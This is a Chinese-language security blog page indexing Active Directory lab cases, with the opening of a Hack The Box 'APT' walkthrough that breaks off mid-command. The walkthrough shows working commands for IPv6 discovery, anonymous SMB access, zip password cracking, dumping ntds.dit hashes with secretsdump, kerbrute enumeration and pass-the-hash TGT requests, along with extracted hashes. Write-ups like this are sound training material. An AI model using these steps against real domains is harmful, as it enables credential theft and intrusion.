---
title: Kerberos、凭据材料与服务权限
url: https://lucifer11.xyz/knowledge/kerberos/
source: 0xfd's blog
date: 2026-11-25
fetch_date: 2026-11-26T10:13:58.105021
---

# Kerberos、凭据材料与服务权限

![0xfd's blog](/images/fifteen-katana-zero-katana-zero.gif)
[0xfd's blog](/)

by 0xfd

* [首页](/)
* [知识库](/knowledge/)
* [导读](/guide/)
* [分类](/categories/)
* [标签](/tags/)
* [归档](/archives/)
* [关于](/about/)
* 搜索

* 文章目录
* 站点概览

1. [分析重点](#%E5%88%86%E6%9E%90%E9%87%8D%E7%82%B9)
2. [案例与技术索引](#%E6%A1%88%E4%BE%8B%E4%B8%8E%E6%8A%80%E6%9C%AF%E7%B4%A2%E5%BC%95)
3. [IPv6 暴露面与认证协议差异](#IPv6-%E6%9A%B4%E9%9C%B2%E9%9D%A2%E4%B8%8E%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E5%B7%AE%E5%BC%82)
4. [WriteSPN 权限与域会话分析](#WriteSPN-%E6%9D%83%E9%99%90%E4%B8%8E%E5%9F%9F%E4%BC%9A%E8%AF%9D%E5%88%86%E6%9E%90)
5. [表格与证书中的身份材料](#%E8%A1%A8%E6%A0%BC%E4%B8%8E%E8%AF%81%E4%B9%A6%E4%B8%AD%E7%9A%84%E8%BA%AB%E4%BB%BD%E6%9D%90%E6%96%99)
6. [PFX 身份与 LAPS 读取范围](#PFX-%E8%BA%AB%E4%BB%BD%E4%B8%8E-LAPS-%E8%AF%BB%E5%8F%96%E8%8C%83%E5%9B%B4)

![253](/images/fifteen-katana-zero-katana-zero.gif)

253

漏洞分析、利用机制、二进制研究与安全工程

[83
日志](/archives/)

[65
分类](/categories/)

[312
标签](/tags/)

GitHub

E-Mail

Twitter

FB Page

YouTube

Instagram

infosec.exchange

![Creative Commons](https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg)

0%

链接

* atsud0
* 记忆里的纯真
* 小离

# Kerberos、凭据材料与服务权限

发表于
2026-11-25

分类于

[身份与域安全](/categories/%E8%BA%AB%E4%BB%BD%E4%B8%8E%E5%9F%9F%E5%AE%89%E5%85%A8/)
，
[域认证](/categories/%E8%BA%AB%E4%BB%BD%E4%B8%8E%E5%9F%9F%E5%AE%89%E5%85%A8/%E5%9F%9F%E8%AE%A4%E8%AF%81/)

阅读次数：

本文字数：
11k

阅读时长 ≈
40 分钟

域用户口令、NTLM、证书、TGT 与服务票据能使用的接口并不相同。本章结合 IPv6 服务、WriteSPN、表格与 PFX 材料，记录原实验中的认证选择、时钟问题和目录读取权限。

域用户口令、NTLM、证书、TGT 与服务票据能使用的接口并不相同。本章结合 IPv6 服务、WriteSPN、表格与 PFX 材料，记录原实验中的认证选择、时钟问题和目录读取权限。

[知识库目录](/knowledge/)
[研究导读](/guide/)
[下载 Markdown](/knowledge/kerberos/source.md)
展开全部技术记录

## 分析重点

APT 记录 NTLM 登录不可用而 TGT 可用的实际差异，同时保留 IPv6 网络位置要求。

Blazorized 将 BloodHound 数据、WriteSPN 与会话权限逐步对应。

Search 与 Timelapse 的 gMSA、LAPS、证书和历史文件分别提供不同身份材料。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [IPv6 暴露面与认证协议差异](#case-apt) | apt | IPv6、Kerberos、NTLM、Active Directory |
| [WriteSPN 权限与域会话分析](#case-blazorized) | blazorized | Kerberos、BloodHound、ACL、DCSync |
| [表格与证书中的身份材料](#case-search) | search | Kerberos、gMSA、证书、BloodHound |
| [PFX 身份与 LAPS 读取范围](#case-timelapse) | timelapse | 证书、WinRM、LAPS |

## IPv6 暴露面与认证协议差异

IOXIDResolver 发现的 IPv6 服务与 IPv4 的可达性不同；备份中的域数据库、可用 TGT、注册表与固定 challenge 的 LM 处理构成原文认证链。

来源 apt · 原记录 2021-02-07 · 24 个代码块 · 4 处图片引用

查看分析过程、攻击步骤与完整代码

#### introduce

OS: Windows
Difficulty: Insane
Points: 50
Release: 31 Oct 2020
IP: 10.10.10.213

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb177.jpg)
* ![my htb rank](http://www.hackthebox.eu/badge/image/235857)

#### information gathering

first use nmap as usaul

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` ┌──(root💀kali)-[~/hackthebox/machine/apt] └─# nmap -sV -v -p- --min-rate=10000 10.10.10.213 PORT    STATE SERVICE    VERSION 80/tcp  open  tcpwrapped 135/tcp open  tcpwrapped ``` |

ipv6扫描，首先用脚本获得ipv6地址：

* IOXIDResolver

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 ``` | ``` ┌──(root💀kali)-[~/hackthebox/machine/apt] └─# python /root/IOXIDResolver-master/IOXIDResolver.py -t 10.10.10.213 [*] Retrieving network interface of 10.10.10.213 Address: apt Address: 10.10.10.213 Address: dead:beef::b885:d62a:d679:573f Address: dead:beef::3d18:f278:e3b:8a82 ``` |

加hosts：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` dead:beef::b885:d62a:d679:573f apt.htb ``` |

#### ipv6 scan

Ipv6看到很多端口可能开放，例如445:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 ``` | ``` ┌──(root💀kali)-[~/hackthebox/machine/apt] └─# nmap -vv --reason -6 -Pn -sU -A --top-ports=20 --version-all dead:beef::b885:d62a:d679:573f ... PORT      STATE         SERVICE      REASON      VERSION 53/udp    open|filtered domain       no-response 67/udp    open|filtered dhcps        no-response 68/udp    open|filtered dhcpc        no-response 69/udp    open|filtered tftp         no-response 123/udp   open|filtered ntp          no-response 135/udp   open|filtered msrpc        no-response 137/udp   open|filtered netbios-ns   no-response 138/udp   open|filtered netbios-dgm  no-response 139/udp   open|filtered netbios-ssn  no-response 161/udp   open|filtered snmp         no-response 162/udp   open|filtered snmptrap     no-response 445/udp   open|filtered microsoft-ds no-response 500/udp   open|filtered isakmp       no-response 514/udp   open|filtered syslog       no-response 520/udp   open|filtered route        no-response 631/udp   open|filtered ipp          no-response 1434/udp  open|filtered ms-sql-m     no-response 1900/udp  open|filtered upnp         no-response 4500/udp  open|filtered nat-t-ike    no-response 49152/udp open|filtered unknown      no-response ... ``` |

#### SMB

这里需要vpn和smbclient同一台机器才能访问到ipv6地址，mac连vpn，kali虚拟机能访问到靶机ipv4,访问不了ipv6:

smb匿名访问，可以看到有个backup目录：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 ``` | ``` ┌──(root💀kali)-[~/hackthebox/machine/apt] └─# smbclient -L //apt.htb/ -U"" Enter WORKGROUP\root's password:  Anonymous login successful          Sharename       Type      Comment         ---------       ----      -------         backup          Disk               IPC$            IPC       Remote IPC         NETLOGON        Disk      Logon server share          SYSVOL          Disk      Logon server share  apt.htb is an IPv6 address -- no workgroup available ``` |

#### backup

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 ``` | ``` ┌──(root💀kali)-[~/hackthebox/machine/apt] └─# smbclient //apt.htb/backup -U"" Enter WORKGROUP\root's password:  Anonymous login successful Try "help" to get a list of possible commands. smb: \> dir   .                                   D        0  Thu Sep 24 03:30:52 2020   ..                                  D        0  Thu Sep 24 03:30:52 2020   backup.zip                          A 10650961  Thu Sep 24 03:30:32 2020                  10357247 blocks of size 4096. 7270207 blocks available smb: \> get backup.zip ``` |

里面是一个zip文件，下载下来：

解压需要密码

#### zip crack

首先破解压缩包密码：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip  PASSWORD FOUND!!!!: pw == iloveyousomuch ``` |

#### secrets

看到里面有SYSTEM和ntds.dit，那就是通过这两个文件提取hash：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` cp Active\ Directory/ntds.dit . cp registry/SYSTEM . impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL > user_pass_and_hash.txt ``` |

手动把txt开头结尾的输出删掉，只留hash信息

#### users.txt

提取出用户名：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` cat users_and_hashes.txt | awk -F '\\:' '{print $1}' | uniq -u | sort > users.txt ``` |

#### kerbrute

用kerbrute筛选出有效的用户名：

* kerbrute

这里先改下hosts, 域控和域也加进去：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` dead:beef::b885:d62a:d679:573f apt.htb apt.htb.local htb.local ``` |

之后kerbrute做用户枚举：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` ./kerbrute --dc apt.htb.local -d htb.local users.txt ``` |

有三个有效用户名，需要关注henry.vinson(爆破挺费时间的，等吧)：

#### henry.vinson

hash也只需要这个用户的就可以，但这个hash并不能直接用于登录：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` cat users_and_hashes.txt | grep henry.vinson  henry.vinson:3647:aad3b435b51404eeaad3b435b51404ee:2de80758521541d19cabba480b260e8f::: henry.vinson:aes256-cts-hmac-sha1-96:4c0ec4cffc953266ed72d9b565da62115655d2f402416af92e4e76d121663e2f henry.vinson:aes128-cts-hmac-sha1-96:da63c28166768a2829f00d30ec9fbddd henry.vinson:des-cbc-md5:80a2c83213b3dfd6 ``` |

#### hashes

之前得到的那些也可以处理一下，只留hash：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` cat users_and_hashes.txt | grep -v aes | grep -v des | awk -F '\\:' '{print $3":"$4}' > hashes.txt ``` |

#### getTGT

如果尝试crackmapexec用有效用户名和hash组合爆破的话会被锁定，可以使用getTGT, 得到有效hash及tgt(hash不能通过evil-winrm登录):

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 ``` | ``` ┌──(root💀kali)-[~/hackthebox/machine/apt] └─# python3 /usr/share/doc/python3-impacket/examples/getTGT.py HTB.local/henry.vinson@apt.htb -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb Impacket v0.9.22 - Copyright 2020 SecureAu...